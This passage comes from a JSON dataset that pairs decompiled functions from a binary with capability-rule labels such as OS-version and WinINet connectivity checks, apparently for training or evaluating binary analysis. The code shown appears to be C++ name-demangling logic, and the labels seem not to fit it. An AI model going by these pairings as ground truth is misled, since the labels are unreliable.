uVar7, 0);\n        break;\n    case 0x402d50:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x23, uVar7, 0);\n        break;\n    case 0x402d80:\n        cVar1 = pcVar2[1];\n        if (((9 < cVar1 - 0x30U) && (cVar1 != '_')) && (0x19 < cVar1 + 0xbfU)) {\n            apiStack48[0] = fcn.004024c0(arg1);\n            if (apiStack48[0] == NULL) {\n                return NULL;\n            }\n            if (*apiStack48[0] == 0x18) {\n                return apiStack48[0];\n            }\n            goto code_r0x00402ab9;\n        }\n        apiStack48[0] = fcn.00401b00(arg1, 0);\n        if (**(arg1 + 0x18) != 'I') {\n            return apiStack48[0];\n        }\ncode_r0x00402db7:\n        uVar7 = fcn.004023a0(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 4, apiStack48[0], uVar7);\n        break;\n    case 0x402de0:\n        apiStack48[0] = fcn.00401e70(arg1);\n        if (**(arg1 + 0x18) == 'I') {\n            if (apiStack48[0] == NULL) {\n                return NULL;\n            }\n            iVar10 = *(arg1 + 0x38);\n            if (*(arg1 + 0x3c) <= iVar10) {\n                return NULL;\n            }\n            *(*(arg1 + 0x30) + iVar10 * 8) = apiStack48[0];\n            *(arg1 + 0x38) = iVar10 + 1;\n            goto code_r0x00402db7;\n        }\n        break;\n    case 0x402e22:\n        *(arg1 + 0x18) = pcVar2 + 1;\n        piVar6 = fcn.00401f20(arg1);\n        apiStack48[0] = piVar6;\n        uVar7 = fcn.00402960(arg1);\n        apiStack48[0] = fcn.004017e0(arg1, 0x21, uVar7, piVar6);\n        break;\n    case 0x402e60:\n        iVar10 = *(arg1 + 0x28);\n        iVar11 = (cVar1 + -0x61) * 0x20 + 0x42e920;\n        if (iVar10 < *(arg1 + 0x2c)) {\n            *(arg1 + 0x28) = iVar10 + 1;\n            piVar6 = *(arg1 + 0x20) + iVar10 * 0x18;\n            iVar12 = *0x8;\n            if (piVar6 != NULL) {\n                *piVar6 = 0x27;\n                *(piVar6 + 2) = iVar11;\n                iVar12 = iVar11;\n            }\n        }\n        else {\n            piVar6 = NULL;\n            iVar12 = *0x8;\n        }\n        *(arg1 + 0x50) = *(arg1 + 0x50) + *(iVar12 + 8);\n        *(arg1 + 0x18) = pcVar2 + 1;\n        return piVar6;\n    }\ncode_r0x00402ab0:\n    if (apiStack48[0] != NULL) {\ncode_r0x00402ab9:\n        iVar10 = *(arg1 + 0x38);\n        if (iVar10 < *(arg1 + 0x3c)) {\n            *(*(arg1 + 0x30) + iVar10 * 8) = apiStack48[0];\n            *(arg1 + 0x38) = iVar10 + 1;\n            return apiStack48[0];\n        }\n    }\ncode_r0x004029e0:\n    return NULL;\n}\n",
        "token_count": 4854
    },
    "004032d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.004032d0(int64_t arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    int64_t *piVar4;\n    int64_t aiStack32 [2];\n    \n    pcVar3 = *(arg1 + 0x18);\n    aiStack32[0] = 0;\n    cVar1 = *pcVar3;\n    if (((cVar1 == '\\0') || (cVar1 == 'E')) || (cVar1 == '.')) {\n        return 0;\n    }\n    piVar4 = aiStack32;\n    do {\n        if (cVar1 == 'O') {\n            cVar1 = pcVar3[1];\njoined_r0x00403314:\n            if (cVar1 == 'E') {\ncode_r0x00403370:\n                if (aiStack32[0] == 0) {\n                    return 0;\n                }\n                if (((*(aiStack32[0] + 0x10) == 0) && (**(aiStack32[0] + 8) == 0x27)) &&\n                   (iVar2 = *(*(aiStack32[0] + 8) + 2),  *(iVar2 + 0x1c) == 9)) {\n                    *(arg1 + 0x50) = *(arg1 + 0x50) - *(iVar2 + 8);\n                    *(aiStack32[0] + 8) = 0;\n                }\n                return aiStack32[0];\n            }\n        }\n        else if (cVar1 == 'R') {\n            cVar1 = pcVar3[1];\n            goto joined_r0x00403314;\n        }\n        iVar2 = fcn.00402960(arg1);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.004017e0(arg1, 0x2e, iVar2, 0);\n        *piVar4 = iVar2;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        pcVar3 = *(arg1 + 0x18);\n        piVar4 = iVar2 + 0x10;\n        cVar1 = *pcVar3;\n        if (((cVar1 == '\\0') || (cVar1 == 'E')) || (cVar1 == '.')) goto code_r0x00403370;\n    } while( true );\n}\n",
        "token_count": 542
    },
    "00403430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * fcn.00403430(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t *piVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t *arg4;\n    uint32_t *puVar9;\n    uint8_t uVar10;\n    ulong arg2_00;\n    int64_t iVar11;\n    char *arg2_01;\n    uint32_t uVar12;\n    \n    pcVar4 = *(arg1 + 0x18);\n    if ((*pcVar4 != 'T') && (*pcVar4 != 'G')) {\n        arg4 = fcn.004024c0(arg1);\n        if ((arg4 != NULL) && ((arg2 != 0 && ((*(arg1 + 0x10) & 1) == 0)))) {\n            uVar12 = *arg4;\n            while (uVar12 - 0x1c < 5) {\n                arg4 = *(arg4 + 2);\n                uVar12 = *arg4;\n            }\n            if (uVar12 == 2) {\n                piVar5 = *(arg4 + 4);\n                iVar7 = *piVar5;\n                while (iVar7 - 0x1cU < 5) {\n                    piVar5 = *(piVar5 + 2);\n                    iVar7 = *piVar5;\n                }\n                *(arg4 + 4) = piVar5;\n                return arg4;\n            }\n            return arg4;\n        }\n        if ((arg4 == NULL) || (**(arg1 + 0x18) == '\\0')) {\n            return arg4;\n        }\n        puVar9 = arg4;\n        if (**(arg1 + 0x18) == 'E') {\n            return arg4;\n        }\n        do {\n            uVar12 = *puVar9;\n            if (uVar12 == 4) {\n                piVar5 = *(puVar9 + 2);\n                if ((piVar5 == NULL) || (0x32 < *piVar5 - 1U)) goto code_r0x004035ca;\n                uVar10 = *piVar5 - 1U;\n                goto joined_r0x00403589;\n            }\n        } while (((3 < uVar12) && (uVar12 - 0x1c < 5)) && (puVar9 = *(puVar9 + 2),  puVar9 != NULL));\ncode_r0x004034b0:\n        arg2_00 = 0;\n        goto code_r0x004035cf;\n    }\n    iVar7 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = iVar7 + 0x14;\n    if (*pcVar4 == 'T') {\n        *(arg1 + 0x18) = pcVar4 + 1;\n        if (pcVar4[1] == '\\0') {\n            return 0;\n        }\n        *(arg1 + 0x18) = pcVar4 + 2;\n        if (0x33 < pcVar4[1] + 0xbdU) {\n            return 0;\n        }\n    // switch table (52 cases) at 0x42d7ec\n        switch(*((pcVar4[1] + 0xbdU) * 4 + 0x42d7ec) + 0x42d7ec) {\n        case 0x40353e:\n            goto code_r0x00403540;\n        case 0x4037f6:\n            iVar7 = fcn.00402000(arg1, 0x76);\n            if (iVar7 == 0) {\n                return 0;\n            }\n            arg4 = fcn.00403430(arg1, 0);\n            puVar9 = NULL;\n            uVar12 = 0x10;\n            break;\n        case 0x403825:\n            iVar7 = fcn.00402000(arg1, 0);\n            if (iVar7 == 0) {\n                return 0;\n            }\n            iVar7 = fcn.00402000(arg1, 0);\n            if (iVar7 == 0) {\n                return 0;\n            }\n            arg4 = fcn.00403430(arg1, 0);\n            puVar9 = NULL;\n            uVar12 = 0x11;\n            break;\n        case 0x403863:\n            arg4 = fcn.004024c0(arg1);\n            puVar9 = NULL;\n            uVar12 = 0x15;\n            break;\n        case 0x40387b:\n            iVar7 = fcn.00402000(arg1, 0x68);\n            if (iVar7 == 0) {\n                return 0;\n            }\n            arg4 = fcn.00403430(arg1, 0);\n            puVar9 = NULL;\n            uVar12 = 0xf;\n            break;\n        case 0x4038aa:\n            *(arg1 + 0x50) = iVar7 + 0xf;\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 9;\n            break;\n        case 0x4038c8:\n            *(arg1 + 0x50) = iVar7 + 10;\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 10;\n            break;\n        case 0x4038e6:\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 0xd;\n            break;\n        case 0x4038fe:\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 0x12;\n            break;\n        case 0x403916:\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 0xc;\n            break;\n        case 0x40392e:\n            arg4 = fcn.004024c0(arg1);\n            puVar9 = NULL;\n            uVar12 = 0x14;\n            break;\n        case 0x403946:\n            arg4 = fcn.00402960(arg1);\n            puVar9 = NULL;\n            uVar12 = 0xe;\n            break;\n        case 0x40395e:\n            puVar9 = fcn.00402960(arg1);\n            iVar7 = fcn.00401d60(arg1 + 0x18);\n            if (iVar7 < 0) {\n                return 0;\n            }\n            if (**(arg1 + 0x18) != '_') {\n                return 0;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            arg4 = fcn.00402960(arg1);\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 5;\n            uVar12 = 0xb;\n        }\n    }\n    else {\n        if ((*pcVar4 != 'G') || (*(arg1 + 0x18) = pcVar4 + 1,  pcVar4[1] == '\\0')) {\ncode_r0x00403540:\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar4 + 2;\n        if (0x31 < pcVar4[1] + 0xbfU) {\n            return 0;\n        }\n    // switch table (50 cases) at 0x42d724\n        switch(*((pcVar4[1] + 0xbfU) * 4 + 0x42d724) + 0x42d724) {\n        case 0x40353e:\n            goto code_r0x00403540;\n        case 0x403680:\n            iVar7 = fcn.00401d60(arg1 + 0x18);\n            if (iVar7 < 2) {\n                return 0;\n            }\n            pcVar4 = *(arg1 + 0x18);\n            if (*pcVar4 == '\\0') {\n                return 0;\n            }\n            arg2_01 = pcVar4 + 1;\n            *(arg1 + 0x18) = arg2_01;\n            if (*pcVar4 != '_') {\n                return 0;\n            }\n            iVar7 = iVar7 + -1;\n            puVar9 = NULL;\n            do {\n                if (*arg2_01 == '\\0') {\n                    return 0;\n                }\n                iVar11 = 0;\n                if (*arg2_01 == '$') {\n                    cVar2 = arg2_01[1];\n                    if (cVar2 == 'S') {\n                        uVar12 = 0x2f;\n                    }\n                    else if (cVar2 == '_') {\n                        uVar12 = 0x2e;\n                    }\n                    else {\n                        if (cVar2 != '$') {\n                            return 0;\n                        }\n                        uVar12 = 0x24;\n                    }\n                    iVar3 = *(arg1 + 0x28);\n                    if (*(arg1 + 0x2c) <= iVar3) {\ncode_r0x00403a42:\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 2;\n                        return 0;\n                    }\n                    *(arg1 + 0x28) = iVar3 + 1;\n                    arg4 = *(arg1 + 0x20) + iVar3 * 0x18;\n                    if (arg4 == NULL) goto code_r0x00403a42;\n                    arg4[2] = uVar12;\n                    iVar11 = *(arg1 + 0x18);\n                    iVar7 = iVar7 + -2;\n                    *arg4 = 0x3f;\n                    arg2_01 = iVar11 + 2;\n                    *(arg1 + 0x18) = arg2_01;\n                }\n                else {\n                    do {\n                        uVar12 = iVar11;\n                        if ((arg2_01[iVar11] == '\\0') || (arg2_01[iVar11] == '$')) goto code_r0x004036ff;\n                        uVar12 = uVar12 + 1;\n                        iVar11 = iVar11 + 1;\n                    } while (iVar11 < iVar7);\n                    iVar11 = uVar12;\ncode_r0x004036ff:\n                    arg4 = fcn.00401860(arg1, arg2_01, uVar12);\n                    arg2_01 = iVar11 + *(arg1 + 0x18);\n                    iVar7 = iVar7 - uVar12;\n                    *(arg1 + 0x18) = arg2_01;\n                    if (arg4 == NULL) {\n                        return 0;\n                    }\n                }\n                if ((puVar9 != NULL) && (arg4 = fcn.004017e0(arg1, 0x3e, puVar9, arg4),  arg4 == NULL)) {\n                    return 0;\n                }\n                puVar9 = arg4;\n            } while (0 < iVar7);\n            puVar9 = NULL;\n            uVar12 = 0x3d;\n            break;\n        case 0x403765:\n            arg4 = fcn.004024c0(arg1);\n            puVar9 = NULL;\n            uVar12 = 0x13;\n            break;\n        case 0x403780:\n            arg4 = fcn.004024c0(arg1);\n            puVar9 = fcn.00401dd0(arg1);\n            uVar12 = 0x16;\n            break;\n        case 0x4037a3:\n            arg4 = fcn.00403430(arg1, 0);\n            puVar9 = NULL;\n            uVar12 = 0x17;\n            break;\n        case 0x4037c0:\n            if ((pcVar4[2] == '\\0') || (*(arg1 + 0x18) = pcVar4 + 3,  pcVar4[2] != 'n')) {\n                arg4 = fcn.00403430(arg1, 0);\n                puVar9 = NULL;\n                uVar12 = 0x47;\n            }\n            else {\n                arg4 = fcn.00403430(arg1, 0);\n                puVar9 = NULL;\n                uVar12 = 0x48;\n            }\n        }\n    }\ncode_r0x004035e2:\n    puVar8 = puVar9;\n    switch(uVar12) {\n    default:\n        goto code_r0x00401850;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 0xb:\n    case 0x21:\n    case 0x2b:\n    case 0x2d:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3b:\n    case 0x3c:\n    case 0x3e:\n    case 0x4a:\n    case 0x4b:\n        if (arg4 == NULL) {\n            return 0;\n        }\n        break;\n    case 9:\n    case 10:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n    case 0x16:\n    case 0x17:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x28:\n    case 0x33:\n    case 0x34:\n    case 0x3a:\n    case 0x3d:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n    case 0x47:\n    case 0x48:\n    case 0x49:\n        puVar8 = arg4;\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x29:\n    case 0x2e:\n    case 0x2f:\n        goto code_r0x00401805;\n    case 0x2a:\n    case 0x30:\n        break;\n    }\n    if (puVar8 != NULL) {\ncode_r0x00401805:\n        iVar7 = *(arg1 + 0x28);\n        puVar8 = NULL;\n        if (iVar7 < *(arg1 + 0x2c)) {\n            *(arg1 + 0x28) = iVar7 + 1;\n            puVar1 = *(arg1 + 0x20) + iVar7 * 0x18;\n            if (puVar1 != NULL) {\n                *puVar1 = uVar12;\n                *(puVar1 + 2) = arg4;\n                *(puVar1 + 4) = puVar9;\n                puVar8 = puVar1;\n            }\n        }\n        return puVar8;\n    }\ncode_r0x00401850:\n    return NULL;\njoined_r0x00403589:\n    uVar6 = 1 << (uVar10 & 0x3f);\n    if ((uVar6 & 0x40000000000c0) != 0) goto code_r0x004034b0;\n    if ((((uVar6 & 3) == 0) || (piVar5 = *(piVar5 + 4),  piVar5 == NULL)) || (0x32 < *piVar5 - 1U))\n    goto code_r0x004035ca;\n    uVar10 = *piVar5 - 1U;\n    goto joined_r0x00403589;\ncode_r0x004035ca:\n    arg2_00 = 1;\ncode_r0x004035cf:\n    puVar9 = fcn.004033c0(arg1, arg2_00);\n    uVar12 = 3;\n    goto code_r0x004035e2;\n}\n",
        "token_count": 3685
    },
    "00403a50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401850)\n\nuint * fcn.00403a50(int64_t arg1)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    int32_t iVar8;\n    char cVar9;\n    char cVar10;\n    int32_t iVar11;\n    \n    pcVar3 = *(arg1 + 0x18);\n    if (*pcVar3 == '\\0') {\n        cVar10 = '\\0';\n        cVar9 = '\\0';\n    }\n    else {\n        *(arg1 + 0x18) = pcVar3 + 1;\n        cVar10 = *pcVar3;\n        if (pcVar3[1] == '\\0') {\n            cVar9 = '\\0';\n        }\n        else {\n            *(arg1 + 0x18) = pcVar3 + 2;\n            cVar9 = pcVar3[1];\n        }\n        if (cVar10 == 'v') {\n            if (cVar9 - 0x30U < 10) {\n                iVar6 = fcn.00401f20(arg1);\n                iVar11 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar11) {\n                    return NULL;\n                }\n                *(arg1 + 0x28) = iVar11 + 1;\n                puVar5 = *(arg1 + 0x20) + iVar11 * 0x18;\n                if (puVar5 == NULL) {\n                    return NULL;\n                }\n                if (iVar6 == 0) {\n                    return NULL;\n                }\n                *(puVar5 + 4) = iVar6;\n                *puVar5 = 0x32;\n                puVar5[2] = cVar9 + -0x30;\n                return puVar5;\n            }\n        }\n        else if ((cVar9 == 'v') && (cVar10 == 'c')) {\n            uVar7 = fcn.00402960(arg1);\n    // WARNING: Could not recover jumptable at 0x004017f7. Too many branches\n    // WARNING: Treating indirect jump as call\n            puVar5 = (*(*0x42d32c + 0x42d260))(arg1, 0x33, uVar7, 0);\n            return puVar5;\n        }\n    }\n    iVar8 = 0;\n    iVar11 = 0x3d;\n    do {\n        while( true ) {\n            iVar4 = (iVar11 - iVar8) / 2 + iVar8;\n            ppcVar1 = iVar4 * 0x18 + 0x42e220;\n            pcVar3 = *ppcVar1;\n            cVar2 = *pcVar3;\n            if (cVar10 != cVar2) break;\n            cVar2 = pcVar3[1];\n            if (cVar9 == cVar2) {\n                iVar11 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar11) {\n                    return NULL;\n                }\n                *(arg1 + 0x28) = iVar11 + 1;\n                puVar5 = *(arg1 + 0x20) + iVar11 * 0x18;\n                if (puVar5 != NULL) {\n                    *puVar5 = 0x31;\n                    *(puVar5 + 2) = ppcVar1;\n                    return puVar5;\n                }\n                return NULL;\n            }\n            if (cVar9 < cVar2) goto code_r0x00403b0a;\ncode_r0x00403b49:\n            iVar8 = iVar4 + 1;\n            if (iVar8 == iVar11) {\n                return NULL;\n            }\n        }\n        if (cVar2 <= cVar10) goto code_r0x00403b49;\ncode_r0x00403b0a:\n        iVar11 = iVar4;\n        if (iVar8 == iVar4) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 923
    },
    "00403be0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00403be0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int32_t *arg3;\n    int64_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char cVar8;\n    bool bVar9;\n    \n    pcVar6 = *(arg1 + 0x18);\n    cVar8 = *pcVar6;\n    if (cVar8 - 0x30U < 10) {\n        arg3 = fcn.00401f20(arg1);\n        pcVar7 = *(arg1 + 0x18);\n        cVar8 = *pcVar7;\n        goto joined_r0x00403cc7;\n    }\n    if (cVar8 + 0x9fU < 0x1a) {\n        arg3 = fcn.00403a50(arg1);\n        if ((arg3 != NULL) && (*arg3 == 0x31)) {\n            iVar5 = 3;\n            pcVar6 = **(arg3 + 2);\n            iVar2 = *(arg1 + 0x50) + *(*(arg3 + 2) + 2) + 7;\n            bVar9 = iVar2 == 0;\n            *(arg1 + 0x50) = iVar2;\n            pcVar7 = 0x42d8bc;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                bVar9 = *pcVar6 == *pcVar7;\n                pcVar6 = pcVar6 + 1;\n                pcVar7 = pcVar7 + 1;\n            } while (bVar9);\n            if (bVar9) {\n                uVar4 = fcn.00401f20(arg1);\n                arg3 = fcn.004017e0(arg1, 0x35, arg3, uVar4);\n                pcVar7 = *(arg1 + 0x18);\n                cVar8 = *pcVar7;\n                goto joined_r0x00403cc7;\n            }\n        }\n    }\n    else {\n        if (cVar8 + 0xbdU < 2) {\n            piVar1 = *(arg1 + 0x48);\n            if ((piVar1 != NULL) && ((*piVar1 == 0 || (*piVar1 == 0x18)))) {\n                *(arg1 + 0x50) = *(arg1 + 0x50) + piVar1[4];\n                cVar8 = *pcVar6;\n            }\n            if (cVar8 == 'C') {\n                cVar8 = pcVar6[1];\n                if (cVar8 == '2') {\n                    iVar2 = 2;\n                }\n                else if (cVar8 < '3') {\n                    iVar2 = 1;\n                    if (cVar8 != '1') {\n                        return NULL;\n                    }\n                }\n                else if (cVar8 == '3') {\n                    iVar2 = 3;\n                }\n                else {\n                    iVar2 = 4;\n                    if (cVar8 != '5') {\n                        return NULL;\n                    }\n                }\n                iVar3 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar6 + 2;\n                if (*(arg1 + 0x2c) <= iVar3) goto code_r0x00403fb3;\n                *(arg1 + 0x28) = iVar3 + 1;\n                arg3 = *(arg1 + 0x20) + iVar3 * 0x18;\n                if ((arg3 == NULL) || (piVar1 == NULL)) goto code_r0x00403fb3;\n                *arg3 = 7;\n                arg3[2] = iVar2;\n                *(arg3 + 4) = piVar1;\n            }\n            else {\n                if (cVar8 != 'D') {\n                    arg3 = NULL;\n                    pcVar7 = pcVar6;\n                    goto joined_r0x00403cc7;\n                }\n                cVar8 = pcVar6[1];\n                if (cVar8 == '1') {\n                    iVar2 = 2;\n                }\n                else if (cVar8 < '2') {\n                    iVar2 = 1;\n                    if (cVar8 != '0') {\n                        return NULL;\n                    }\n                }\n                else if (cVar8 == '2') {\n                    iVar2 = 3;\n                }\n                else {\n                    iVar2 = 4;\n                    if (cVar8 != '5') {\n                        return NULL;\n                    }\n                }\n                iVar3 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar6 + 2;\n                if (iVar3 < *(arg1 + 0x2c)) {\n                    *(arg1 + 0x28) = iVar3 + 1;\n                    arg3 = *(arg1 + 0x20) + iVar3 * 0x18;\n                    if ((arg3 != NULL) && (piVar1 != NULL)) {\n                        *arg3 = 8;\n                        arg3[2] = iVar2;\n                        *(arg3 + 4) = piVar1;\n                        goto code_r0x00403e99;\n                    }\n                }\ncode_r0x00403fb3:\n                arg3 = NULL;\n            }\ncode_r0x00403e99:\n            cVar8 = pcVar6[2];\n            pcVar7 = pcVar6 + 2;\n            goto joined_r0x00403cc7;\n        }\n        if (cVar8 != 'L') {\n            if (cVar8 != 'U') {\n                return NULL;\n            }\n            if (pcVar6[1] == 'l') {\n                *(arg1 + 0x18) = pcVar6 + 1;\n                cVar8 = pcVar6[1];\n                pcVar7 = pcVar6 + 1;\n                arg3 = NULL;\n                if (cVar8 != 'l') goto joined_r0x00403cc7;\n                *(arg1 + 0x18) = pcVar6 + 2;\n                iVar5 = fcn.004032d0(arg1);\n                pcVar7 = *(arg1 + 0x18);\n                cVar8 = *pcVar7;\n                if ((iVar5 == 0) || (arg3 = NULL,  cVar8 != 'E')) goto joined_r0x00403cc7;\n                *(arg1 + 0x18) = pcVar7 + 1;\n                iVar2 = fcn.00401e20(arg1);\n                if ((-1 < iVar2) && (iVar3 = *(arg1 + 0x28),  iVar3 < *(arg1 + 0x2c))) {\n                    *(arg1 + 0x28) = iVar3 + 1;\n                    arg3 = *(arg1 + 0x20) + iVar3 * 0x18;\n                    if (arg3 != NULL) {\n                        *(arg3 + 2) = iVar5;\n                        arg3[4] = iVar2;\n                        iVar3 = *(arg1 + 0x38);\n                        iVar2 = *(arg1 + 0x3c);\n                        *arg3 = 0x44;\n                        if (iVar3 < iVar2) goto code_r0x00403dd6;\n                    }\n                }\n            }\n            else {\n                if (pcVar6[1] != 't') {\n                    return NULL;\n                }\n                arg3 = NULL;\n                *(arg1 + 0x18) = pcVar6 + 1;\n                cVar8 = pcVar6[1];\n                pcVar7 = pcVar6 + 1;\n                if (cVar8 != 't') goto joined_r0x00403cc7;\n                *(arg1 + 0x18) = pcVar6 + 2;\n                iVar2 = fcn.00401e20(arg1);\n                if (iVar2 < 0) goto code_r0x00403d29;\n                iVar3 = *(arg1 + 0x28);\n                if (iVar3 < *(arg1 + 0x2c)) {\n                    *(arg1 + 0x28) = iVar3 + 1;\n                    arg3 = *(arg1 + 0x20) + iVar3 * 0x18;\n                    if (arg3 != NULL) {\n                        arg3[2] = iVar2;\n                        iVar3 = *(arg1 + 0x38);\n                        iVar2 = *(arg1 + 0x3c);\n                        *arg3 = 0x46;\n                        if (iVar3 < iVar2) {\ncode_r0x00403dd6:\n                            *(*(arg1 + 0x30) + iVar3 * 8) = arg3;\n                            *(arg1 + 0x38) = iVar3 + 1;\n                            goto code_r0x00403d29;\n                        }\n                    }\n                }\n            }\n            cVar8 = **(arg1 + 0x18);\n            pcVar7 = *(arg1 + 0x18);\n            arg3 = NULL;\n            goto joined_r0x00403cc7;\n        }\n        *(arg1 + 0x18) = pcVar6 + 1;\n        arg3 = fcn.00401f20(arg1);\n        if (arg3 == NULL) {\n            return NULL;\n        }\n        iVar2 = fcn.00401ee0(arg1);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n    }\ncode_r0x00403d29:\n    cVar8 = **(arg1 + 0x18);\n    pcVar7 = *(arg1 + 0x18);\njoined_r0x00403cc7:\n    while (cVar8 == 'B') {\n        *(arg1 + 0x18) = pcVar7 + 1;\n        uVar4 = fcn.00401f20(arg1);\n        arg3 = fcn.004017e0(arg1, 0x4a, arg3, uVar4);\n        pcVar7 = *(arg1 + 0x18);\n        cVar8 = **(arg1 + 0x18);\n    }\n    return arg3;\n}\n",
        "token_count": 2270
    },
    "00408790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00408790(int64_t arg1, ulong arg2, int64_t *arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    char cVar2;\n    ulong uVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int32_t *piVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint64_t arg2_00;\n    bool bVar16;\n    uint32_t auStack88 [8];\n    \n    arg2_00 = arg2;\n    if (arg3 != NULL) {\n        do {\n            if (*(arg1 + 0x130) != 0) {\n                return;\n            }\n            if (*(arg3 + 2) == 0) {\n                piVar10 = arg3[1];\n                iVar5 = *piVar10;\n                if ((arg4 != 0) || (4 < iVar5 - 0x1cU)) {\n                    *(arg3 + 2) = 1;\n                    uVar3 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = arg3[3];\n                    if (iVar5 == 0x29) {\n                        fcn.00408de0(arg1, arg2_00, piVar10 + 4, *arg3);\n                        *(arg1 + 0x120) = uVar3;\n                        return;\n                    }\n                    if (iVar5 == 0x2a) {\n                        fcn.00408b60(arg1, arg2_00, piVar10 + 2, *arg3);\n                        *(arg1 + 0x120) = uVar3;\n                        return;\n                    }\n                    if (iVar5 == 2) {\n                        uVar4 = *(arg1 + 0x128);\n                        *(arg1 + 0x128) = 0;\n                        fcn.00407f90(arg1, arg2_00, *(piVar10 + 2));\n                        *(arg1 + 0x128) = uVar4;\n                        iVar8 = *(arg1 + 0x100);\n                        if ((arg2 & 4) == 0) {\n                            puVar11 = 0x42d8d4;\n                            do {\n                                uVar1 = *puVar11;\n                                if (iVar8 == 0xff) {\n                                    *(arg1 + 0xff) = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                    iVar9 = 0;\n                                    iVar8 = 1;\n                                }\n                                else {\n                                    iVar9 = iVar8;\n                                    iVar8 = iVar8 + 1;\n                                }\n                                puVar11 = puVar11 + 1;\n                                *(arg1 + 0x100) = iVar8;\n                                *(arg1 + iVar9) = uVar1;\n                                *(arg1 + 0x108) = uVar1;\n                            } while (puVar11 != 0x42d8d6);\n                        }\n                        else {\n                            if (iVar8 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                iVar9 = 1;\n                                iVar8 = 0;\n                            }\n                            else {\n                                iVar9 = iVar8 + 1;\n                            }\n                            *(arg1 + 0x100) = iVar9;\n                            *(arg1 + iVar8) = 0x2e;\n                            *(arg1 + 0x108) = 0x2e;\n                        }\n                        piVar10 = *(arg3[1] + 0x10);\n                        iVar5 = *piVar10;\n                        if (iVar5 != 0x45) goto code_r0x00408956;\n                        iVar8 = *(arg1 + 0x100);\n                        pcVar12 = \"{default arg#\";\n                        do {\n                            cVar2 = 